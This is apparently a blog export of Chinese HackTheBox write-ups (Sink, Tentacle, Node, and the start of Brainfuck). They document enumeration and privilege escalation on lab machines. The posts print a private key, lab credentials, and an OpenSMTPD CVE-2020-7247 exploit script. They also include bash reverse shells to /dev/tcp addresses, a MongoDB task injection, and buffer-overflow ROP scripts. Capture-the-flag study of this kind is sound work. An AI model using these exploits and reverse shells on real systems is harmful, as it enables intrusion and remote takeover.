mLxZqnXzWbZUT0u2V1yG&#x2F;pwvBQ8FAcR&#x2F;PBnli3us2UAjRmV8D5&#x2F;ya42Yr1gnj6bBAAAAwDdnyIt&#x2F;T1MnbQOqkuyuc+KB5S9tanN34Yp1AIR3pDzEznhrX49qA53I9CSZbE2uce7eFPMuTtRkJO2d15XVFnFWOXzzPI&#x2F;uQ24KFOztcOklHRf+g06yIG&#x2F;Y+wflmyLb74qj+PHXwXgvEVhqJdfWQYSywFapC40WK8zLHTCv49f5&#x2F;bh7kWHipNmshMgC67QkmqCgp3ULsvFFTVOJpkjzKyHezk25gIPzpGvbIGDPGvsSYTdyR6OV6irxxnymdXyuFwAAAMEA9PN7IO0gA5JlCIvUcs5Vy&#x2F;gvo2ynrx7Wo8zo4mUSlafJ7eo8FtHdjna&#x2F;eFaJU0kf0RV2UaPgGWmPZQaQiWbfgLk4hvz6jDYs9MNTJcLg+oIvtTZ2u0&#x2F;lloqIAVdL4cxj5h6ttgG13Vmx2pB0Jn+wQLv+7HS67OZcmTiiFwvO5yxahPPK14UtTsuJMZOHqHhq2kH+3qgIhU1yFVUwHuqDXbz+jvhNrKHMFuBE4OOnSq8vApFv4BR9CSJxsxEeKvRPAAAAwQDPH0OZ4xF9A2IZYiea02GtQU6kR2EndmQhnz6oYDU3X9wwYmlvAIjXAD9zRbdE7moa5o&#x2F;xa&#x2F;bHSAHHr+dlNFWvQn+KsbnAhIFfT2OYvbTyVkiwpa8uditQUeKU7Q7e7U5h2yv+q8yxyJbt087FfUs&#x2F;dRLuEeSe3ltcXsKjujvObGC1H6wje1uuX+VDZ8UB7lJ9HpPJiNawoBQ1hJfuveMjokkN2HR1rrEGHTDoSDmcVPxmHBWsHf5UiCmudIHQVhEAAAANbWFyY3VzQHVidW50dQECAwQFBg&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- user flag然后直接用这个私钥ssh登录marcus用户，得到user.txt: AWS根据Key_Management相关代码，主要就是aws操作，可以直接在已有代码的基础上进行操作, 下载代码，根据代码信息需要把4566端口转发出来,key和secret可以在Log_Management中找到： 123456ssh -N -L 4566:127.0.0.1:4566 -i marcus_id_rsa marcus@10.10.10.225&#39;credentials&#39; &#x3D;&gt; [ &#39;key&#39; &#x3D;&gt; &#39;AKIAIUEN3QWCPSTEITJQ&#39;, &#39;secret&#39; &#x3D;&gt; &#39;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&#39; ], list secrets123456789101112131415161718192021222324&lt;?phprequire 'vendor/autoload.php';use Aws\\SecretsManager\\SecretsManagerClient;use Aws\\Exception\\AwsException;$client = new SecretsManagerClient([ 'region' =&gt; 'eu', 'endpoint' =&gt; 'http://127.0.0.1:4566', 'credentials' =&gt; [ 'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ', 'secret' =&gt; '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' ], 'version' =&gt; 'latest']);try &#123;$result = $client-&gt;listSecrets(array());var_dump($result);&#125;catch (AwsException $e) &#123; echo $e-&gt;getMessage(); echo \"\\n\";&#125; get secret values1234567891011121314151617181920212223242526272829303132&lt;?phprequire 'vendor/autoload.php';use Aws\\SecretsManager\\SecretsManagerClient;use Aws\\Exception\\AwsException;$client = new SecretsManagerClient([ 'region' =&gt; 'eu', 'endpoint' =&gt; 'http://127.0.0.1:4566', 'credentials' =&gt; [ 'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ', 'secret' =&gt; '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' ], 'version' =&gt; 'latest']);$secretIDs = [\"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-zwTEL\", \"arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-yLXAA\", \"arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-nAWmk\"];try &#123;for ($i=0; $i&lt;count($secretIDs); $i++) &#123; $result = $client-&gt;getSecretValue(array( 'SecretId' =&gt; $secretIDs[$i], )); var_dump($result);&#125;&#125;catch (AwsException $e) &#123; echo $e-&gt;getMessage(); echo \"\\n\";&#125; 123&#123;&quot;username&quot;:&quot;john@sink.htb&quot;,&quot;password&quot;:&quot;R);\\)ShS99mZ~8j&quot;&#125;&#123;&quot;username&quot;:&quot;albert@sink.htb&quot;,&quot;password&quot;:&quot;Welcome123!&quot;&#125;&#123;&quot;username&quot;:&quot;david@sink.htb&quot;,&quot;password&quot;:&quot;EALB&#x3D;bcC&#x3D;&#96;a7f2#k&quot;&#125; david通过aws相关操作得到david密码，切换到david： servers.enc发现一个加密的servers.enc文件，解密还是需要通过aws操作： listkeys项目里自带listkeys，直接运行报错，需要把里面的version改成latest,还有认证信息参考前面的脚本改: 123456789101112131415161718192021222324252627&lt;?phprequire 'vendor/autoload.php';use Aws\\Kms\\KmsClient;use Aws\\Exception\\AwsException;$KmsClient = new Aws\\Kms\\KmsClient([ 'version' =&gt; 'latest', 'region' =&gt; 'eu', 'credentials' =&gt; [ 'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ', 'secret' =&gt; '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' ], 'endpoint' =&gt; 'http://127.0.0.1:4566']);$limit = 100;try &#123; $result = $KmsClient-&gt;listKeys([ 'Limit' =&gt; $limit, ]); var_dump($result);&#125; catch (AwsException $e) &#123; echo $e-&gt;getMessage(); echo \"\\n\";&#125; decrypt12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phprequire 'vendor/autoload.php';use Aws\\Kms\\KmsClient;use Aws\\Exception\\AwsException;$KmsClient = new Aws\\Kms\\KmsClient([ 'version' =&gt; 'latest', 'region' =&gt; 'eu', 'credentials' =&gt; [ 'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ', 'secret' =&gt; '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' ], 'endpoint' =&gt; 'http://127.0.0.1:4566']);$keys = [\"0b539917-5eff-45b2-9fa1-e13f0d2c42ac\", \"16754494-4333-4f77-ad4c-d0b73d799939\", \"2378914f-ea22-47af-8b0c-8252ef09cd5f\", \"2bf9c582-eed7-482f-bfb6-2e4e7eb88b78\", \"53bb45ef-bf96-47b2-a423-74d9b89a297a\", \"804125db-bdf1-465a-a058-07fc87c0fad0\", \"837a2f6e-e64c-45bc-a7aa-efa56a550401\", \"881df7e3-fb6f-4c7b-9195-7f210e79e525\", \"c5217c17-5675-42f7-a6ec-b5aa9b9dbbde\", \"f0579746-10c3-4fd1-b2ab-f312a5a0f3fc\", \"f2358fef-e813-4c59-87c8-70e50f6d4f70\"];$cipherb64 = \"mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8=\";for ($i=0; $i&lt;count($keys); $i++) &#123;try &#123; $result = $KmsClient-&gt;enableKey([ 'KeyId' =&gt; $keys[$i], ]); $result = $KmsClient-&gt;decrypt([ 'CiphertextBlob' =&gt; base64_decode($cipherb64), 'KeyId' =&gt; $keys[$i], 'EncryptionAlgorithm' =&gt; 'RSAES_OAEP_SHA_256', ]); echo base64_encode($result[\"Plaintext\"]);&#125;catch (AwsException $e) &#123;&#125;&#125; servers.yml解密得到的base64解码，gzip解压后是servers.yml，里面有密码： 12name: adminpass: _uezduQ!EY5AHfe2 root flag这个密码就是root密码，直接ssh登录，得到root.txt: 参考资料 HAProxy HTTP request smuggling (CVE-2019-18277) - nathandavison.comhttps://nathandavison.com/blog/haproxy-http-request-smuggling https://docs.aws.amazon.com/index.html SINK [DISCUSSION] | RaidForumshttps://raidforums.com/Thread-Tutorial-SINK-DISCUSSION","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Tentacle - HackTheBox","slug":"Tentacle-HackTheBox","date":"2021-02-01T04:51:29.000Z","updated":"2021-06-21T04:29:34.958Z","comments":true,"path":"2021/02/01/Tentacle-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/02/01/Tentacle-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/310 10.10.10.224 端口扫描很费时间： 12345678910111213➜ ~ nmap -sT -Pn 10.10.10.224Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 10:10 ESTNmap scan report for 10.10.10.224Host is up (0.069s latency).Not shown: 805 closed ports, 191 filtered portsPORT STATE SERVICE22/tcp open ssh53/tcp open domain88/tcp open kerberos-sec3128/tcp open squid-httpNmap done: 1 IP address (1 host up) scanned in 1031.14 seconds 31283128是squid代理，直接访问错误信息里给出域名： 5353端口是dns， 使用3128端口得到的域名对其进行子域名枚举，可以发现一些子域名及内部ip，应该是需要通过squid代理访问： 1234567dnsenum --threads 64 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htbns.realcorp.htb. 259200 IN A 10.197.243.77proxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb.ns.realcorp.htb. 259200 IN A 10.197.243.77wpad.realcorp.htb. 259200 IN A 10.197.243.31ns.realcorp.htb. 259200 IN A 10.197.243.77 proxychains根据得到的信息一步步枚举及尝试，最终的完整代理链： 12345678910# proxychains confhttp 10.10.10.224 3128http 127.0.0.1 3128http 10.197.243.77 3128# kaliproxychains4 firefox wpad.realcorp.htb# hosts10.197.243.31 wpad.realcorp.htb nmap然后通过代理链进行枚举： 1234567891011121314151617➜ ~ proxychains4 nmap 10.197.243.31[proxychains] config file found: /etc/proxychains.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 10:09 ESTNmap scan report for wpad.realcorp.htb (10.197.243.31)Host is up (0.28s latency).Not shown: 993 closed portsPORT STATE SERVICE22/tcp open ssh53/tcp open domain80/tcp open http88/tcp open kerberos-sec464/tcp open kpasswd5749/tcp open kerberos-adm3128/tcp open squid-httpNmap done: 1 IP address (1 host up) scanned in 301.92 seconds wpad.realcorp.htb直接通过代理访问是403: wpad.dat注意wpad是Web Proxy Auto-Discovery Protocol： WPAD 协议分析及内网渗透利用 - 先知社区https://xz.aliyun.com/t/1739#toc-9 可以直接查看wpad.dat文件： 12345678910function FindProxyForURL(url, host) &#123; if (dnsDomainIs(host, \"realcorp.htb\")) return \"DIRECT\"; if (isInNet(dnsResolve(host), \"10.197.243.0\", \"255.255.255.0\")) return \"DIRECT\"; if (isInNet(dnsResolve(host), \"10.241.251.0\", \"255.255.255.0\")) return \"DIRECT\"; return \"PROXY proxy.realcorp.htb:3128\";&#125; 10.241.251.0/24根据wpad配置文件可以发现新的子域10.241.251.0，对其进行探测，发现10.241.251.113的25端口是OpenSMTPD： 123456789101112➜ Tentacle proxychains4 nmap -sC -sV 10.241.251.113[proxychains] config file found: /etc/proxychains.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 11:49 ESTNmap scan report for 10.241.251.113Host is up (0.28s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION25/tcp open smtp OpenSMTPDService Info: Host: smtp.realcorp.htbNmap done: 1 IP address (1 host up) scanned in 282.22 seconds OpenSMTPD相关漏洞： https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt https://github.com/superzerosec/cve-2020-7247 123proxychains4 python3 smtp_exp.py 10.241.251.113 25 'bash -c \"exec bash -i &amp;&gt; /dev/tcp/10.10.14.12/4445 &lt;&amp;1\"'nc -lvvp 4445 exp打到smtp的root： smtp_exp.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import socket, timeimport sysif len(sys.argv) &lt; 4: print(\"usage: getShell.py &lt;host&gt; &lt;port&gt; &lt;command&gt;\") exit()HOST = sys.argv[1]PORT = int(sys.argv[2])rev_shell_cmd = sys.argv[3]payload = b\"\"\"\\r\\n#0\\r\\n#1\\r\\n#2\\r\\n#3\\r\\n#4\\r\\n#5\\r\\n#6\\r\\n#7\\r\\n#8\\r\\n#9\\r\\n#a\\r\\n#b\\r\\n #c\\r\\n#d\\r\\n\"\"\" + rev_shell_cmd.encode() + b\"\"\".\"\"\"for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM): af, socktype, proto, canonname, sa = res try: s = socket.socket(af, socktype, proto) except OSError as msg: s = None continue try: s.connect(sa) except OSError as msg: s.close() s = None continue breakif s is None: print('could not open socket') sys.exit(1)with s: data = s.recv(1024) print('Received', repr(data)) time.sleep(1) print('SENDING HELO') s.send(b\"helo test.com\\r\\n\") data = s.recv(1024) print('RECIEVED', repr(data)) s.send(b\"MAIL FROM:&lt;;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;&gt;\\r\\n\") time.sleep(1) data = s.recv(1024) print('RECIEVED', repr(data)) s.send(b\"RCPT TO:&lt;j.nakazawa@realcorp.htb&gt;\\r\\n\") data = s.recv(1024) print('RECIEVED', repr(data)) s.send(b\"DATA\\r\\n\") data = s.recv(1024) print('RECIEVED', repr(data)) s.send(payload) data = s.recv(1024) print('RECIEVED', repr(data)) s.send(b\"QUIT\\r\\n\") data = s.recv(1024) print('RECIEVED', repr(data))print(\"Exploited Check you netcat :D\")s.close() 信息搜集.msmtprc在j.nakazawa用户目录可以发现.msmtprc文件，里面有密码，但这个密码不能直接ssh： 123456789101112131415161718# Set default values for all following accounts.defaultsauth ontls ontls_trust_file &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;ca-certificates.crtlogfile &#x2F;dev&#x2F;null# RealCorp Mailaccount realcorphost 127.0.0.1port 587from j.nakazawa@realcorp.htbuser j.nakazawapassword sJB&#125;RM&gt;6Z~64_tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60# Set a default accountaccount default : realcorp #kerberos 就是通过kerberos生成ticket，然后ssh直接连接，生成ticket后ssh连接不需要密码，如果提示要密码那就是操作有错： 123456789101112131415161718sudo apt install krb5-user# &#x2F;etc&#x2F;hosts# hosts只留这一个10.10.10.224 srv01.realcorp.htb# &#x2F;etc&#x2F;krb5.conf# 修改&#x2F;添加对应配置default_realm &#x3D; REALCORP.HTBREALCORP.HTB &#x3D; &#123; kdc &#x3D; 10.10.10.224 &#125; # shellkinit j.nakazawa # 密码就是上面得到的klistssh j.nakazawa@10.10.10.224 user flag然后用户目录得到user.txt: 提权信息crontab定时任务发现admin定时运行log_backup.sh： 12345678910111213141516[j.nakazawa@srv01 ~]$ cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed* * * * * admin /usr/local/bin/log_backup.sh log_backup.sh可以看到是定是从squid目录复制文件到admin目录，那么如果我们可以考虑写入认证文件到squid，使其复制到admin，从而我们可以登录： 1234567[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh#!/bin/bash/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/cd /home/admin/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log/usr/bin/rm -f access.log cache.log admin就是写一个.k5login文件进去，使得我们可以用之前生成的ticket以admin用户身份登录： 1234567.k5loginj.nakazawa@REALCORP.HTBcp .k5login &#x2F;var&#x2F;log&#x2F;squid# 尝试几次，同步需要时间ssh admin@srv01.realcorp.htb klist当前admin用户，klist发现很多ticket： 那么什么是keytab文件？ Keytab是一个文件，其中包含Kerberos主体和加密密钥对（从Kerberos密码派生）。您可以使用keytab文件使用Kerberos对各种远程系统进行身份验证，而无需输入密码 12345678910111213141516171819[admin@srv01 ~]$ klist -k /etc/krb5.keytabKeytab name: FILE:/etc/krb5.keytabKVNO Principal---- -------------------------------------------------------------------------- 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB exploit所以我们可以利用kadmin去创建一个root ticket： 1234kadmin -k -t &#x2F;etc&#x2F;krb5.keytab -p kadmin&#x2F;admin@REALCORP.HTBadd_principal root@REALCORP.HTB# 密码自己设置 root flag然后ksu切到root，得到root.txt: 参考资料 WPAD 协议分析及内网渗透利用 - 先知社区https://xz.aliyun.com/t/1739#toc-9 https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt https://github.com/superzerosec/cve-2020-7247 Tentacle Foothold tutorial | RaidForumshttps://raidforums.com/Thread-Tutorial-Tentacle-Foothold-tutorial TENTACLE – Jopraveenhttps://jopraveen.wordpress.com/2021/01/30/tentacle/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Node - HackTheBox","slug":"Node-HackTheBox","date":"2021-01-27T07:28:33.000Z","updated":"2021-01-27T07:29:13.342Z","comments":true,"path":"2021/01/27/Node-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/01/27/Node-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/110 10.10.10.58 端口扫描22和3000: 12345678910111213141516171819202122$ nmap -sC -sV -Pn 10.10.10.58Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 13:57 CSTNmap scan report for 10.10.10.58Host is up (0.071s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)| 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)|_ 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)3000/tcp open hadoop-datanode Apache Hadoop| hadoop-datanode-info:|_ Logs: /login| hadoop-tasktracker-info:|_ Logs: /login|_http-title: MyPlaceService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 76.28 seconds 3000实际上看header就知道是Node.js Express，nmap给出的错误结果是hadoop: 请求中有用户相关接口： Expressusers根据api格式，直接访问api/users可以获取到所有用户信息，其中有admin： 密码就是sha256，可以解出来明文： 1myP14ceAdm1nAcc0uNT ： manchester backup使用这个账号密码登录进去可以获得backup： 响应实际上是backup压缩包的base64，需要自己处理下： zip crackzip解压还需要密码： 直接fcrackzip破解出来密码,解压： credsApp.js里相关信息： 12const url &#x3D; &#39;mongodb:&#x2F;&#x2F;mark:5AYRft73VtFpc84k@localhost:27017&#x2F;myplace?authMechanism&#x3D;DEFAULT&amp;authSource&#x3D;myplace&#39;;const backup_key &#x3D; &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;; mark上面得到的账号密码可以直接用于ssh登录mark,user flag不在这，另外还存在两个用户： ps auxps发现tom用户相关进程 12tom 1229 0.0 6.0 1023212 45892 ? Ssl 05:52 0:01 &#x2F;usr&#x2F;bin&#x2F;node &#x2F;var&#x2F;www&#x2F;myplace&#x2F;app.jstom 1231 0.0 5.8 1009080 44000 ? Ssl 05:52 0:01 &#x2F;usr&#x2F;bin&#x2F;node &#x2F;var&#x2F;scheduler&#x2F;app.js 查看相关文件可以发现是从mongodb中取数据，执行命令 mongo那就可以在mongodb中写入恶意命令，等待tom用户权限执行： 123mongo -u mark -p 5AYRft73VtFpc84k localhost:27017&#x2F;schedulerdb.tasks.insert(&#123;cmd: &#39;&#x2F;bin&#x2F;bash -c &quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.5&#x2F;4445 0&gt;&amp;1&quot;&#39;&#125;) /var/scheduler/app.js1234567891011121314151617181920212223242526272829const exec = require('child_process').exec;const MongoClient = require('mongodb').MongoClient;const ObjectID = require('mongodb').ObjectID;const url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler';MongoClient.connect(url, function(error, db) &#123; if (error || !db) &#123; console.log('[!] Failed to connect to mongodb'); return; &#125; setInterval(function () &#123; db.collection('tasks').find().toArray(function (error, docs) &#123; if (!error &amp;&amp; docs) &#123; docs.forEach(function (doc) &#123; if (doc) &#123; console.log('Executing task ' + doc._id + '...'); exec(doc.cmd); db.collection('tasks').deleteOne(&#123; _id: new ObjectID(doc._id) &#125;); &#125; &#125;); &#125; else if (error) &#123; console.log('Something went wrong: ' + error); &#125; &#125;); &#125;, 30000);&#125;); user flag然后等待mongodb的命令执行，获得tom shell，读取user.txt: 提权信息suid发现backup，结合前面的backup key，下一步利用点： 那就分析这个程序： 12345nc -lvvp 4446 &gt; backupnc 10.10.14.5 4446 &lt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;backup$ file backupbackup: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;343cf2d93fb2905848a42007439494a2b4984369, not stripped 整个流程就是判断key，对输入文件名直接调用system命令进行处理，文件名那里可以溢出构造rop，也可以简单的直接换行注入其他命令 提权 &amp;&amp; root flag换行注入1/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 \"$(printf '\\n/bin/bash\\necho OK')\" ret2got开了ASLR,可以利用自身的system和tmp字符串，构造rop 1234567891011cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space20x080486a0 system()0x080486c0 exit()0x08049ed5 &#x2F;tmp&#x2F;.backup_%i (the argument for system)gcc shell.c -o shellcp shell &#x2F;tmp&#x2F;.backup_%i &amp;&amp; chmod +x &#x2F;tmp&#x2F;.backup_%i&#x2F;usr&#x2F;local&#x2F;bin&#x2F;backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&quot;A&quot;*512+&quot;\\xa0\\x86\\x04\\x08&quot;+&quot;\\xc0\\x86\\x04\\x08&quot;+&quot;\\xd5\\x9e\\x04\\x08&quot;)&#39;) 我们可以在tmp下写文件，那就可以将其作为system的参数: shell.c1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main(void)&#123; setuid(0); system(\"/bin/sh\"); return 0;&#125; bof brute-force暴力方式，爆破libc base构造rop： exp.py1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python2import structfrom subprocess import calllibc_base_addr = 0xf752c000 # ldd /usr/local/bin/backup (choose an average value)exit_off = 0x0002e7b0 # readelf -s /lib32/libc.so.6 | grep exitsystem_off = 0x0003a940 # readelf -s /lib32/libc.so.6 | grep systemsystem_addr = libc_base_addr + system_offexit_addr = libc_base_addr + exit_offsystem_arg = libc_base_addr + 0x15900b # strings -a -t x /lib32/libc.so.6 | grep '/bin/sh'#endianess convertiondef conv(num): return struct.pack(\"&lt;I\",num)# Junk + system + exit + system_argbuf = \"A\" * 512buf += conv(system_addr)buf += conv(exit_addr)buf += conv(system_arg)print \"Calling vulnerable program\"i = 0while (i &lt; 256): print \"Number of tries: %d\" %i i += 1 ret = call([\"./backup\", \"qq\", \"45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\", buf]) if (not ret): break else: print \"Exploit failed\" 参考资料 Node write-up - The Portal of Knowledgehttps://alamot.github.io/node_writeup/#5-using-buffer-overflow-the-brute-force-way https://www.hackthebox.eu/home/machines/writeup/110 HackTheBox - Node - YouTubehttps://www.youtube.com/watch?v=sW10TlZF62w&amp;feature=youtu.be&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Brainfuck - HackTheBox","slug":"Brainfuck-HackTheBox","date":"2021-01-25T07:20:50.000Z","updated":"2021-01-25T07:22:33.591Z","comments":true,"path":"2021/01/25/Brainfuck-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/01/25/Brainfuck-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/17 10.10.10.17 端口扫描22,25,110,143,443,ssl证书里得到子域名: 123456789101112131415161718192021222324252627282930313233$ nmap -sC -sV 10.10.10.17Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-25 13:56 CSTNmap scan report for 10.10.10.17Host is up (0.069s latency).Not shown: 995 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)| 256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)|_ 256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,110/tcp open pop3 Dovecot pop3d|_pop3-capabilities: PIPELINING UIDL USER SASL(PLAIN) TOP CAPA RESP-CODES AUTH-RESP-CODE143/tcp open imap Dovecot imapd|_imap-capabilities: capabilities OK listed LOGIN-REFERRALS SASL-IR AUTH=PLAINA0001 have LITERAL+ post-login Pre-login more IMAP4rev1 ID IDLE ENABLE443/tcp open ssl/http nginx 1.10.0 (Ubuntu)|_http-server-header: nginx/1.10.0 (Ubuntu)|_http-title: Welcome to nginx!| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb| Not valid before: 2017-04-13T11:19:29|_Not valid after: 2027-04-11T11:19:29|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1| tls-nextprotoneg:|_ http/1.1Service Info: Host: brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 95.99 seconds 443直接访问是nginx默认页面： 那就是加hosts： 110.10.10.17 sup3rs3cr3t.brainfuck.htb www.brainfuck.htb brainfuck.htb brainfuck.htb是一个wordpress, 给出一个邮箱地址，并且说明使用了SMTP，前面也有SMTP相关端口开放： sup3rs3cr3t.brainfuck.htbsup3rs3cr3t.brainfuck.htb看起来是一个论坛，有注册登录，先放着： Wordpresswpscan因为是wordpress，那就直接wpscan,发现一个老版本插件： 12345678910111213141516wpscan --url https://brainfuck.htb --disable-tls-checks[i] Plugin(s) Identified:[+] wp-support-plus-responsive-ticket-system | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/ | Last Updated: 2019-09-03T07:57:00.000Z | [!] The version is out of date, the latest version is 9.1.2 | | Found By: Urls In Homepage (Passive Detection) | | Version: 7.1.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt 这个插件存在可利用漏洞： WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation - PHP webapps Exploithttps://www.exploit-db.com/exploits/41006 login就是利用这个插件的逻辑漏洞，登录任意用户,administrator没什么用，登录admin进行后续操作： smtp password在seting -&gt; easy wp 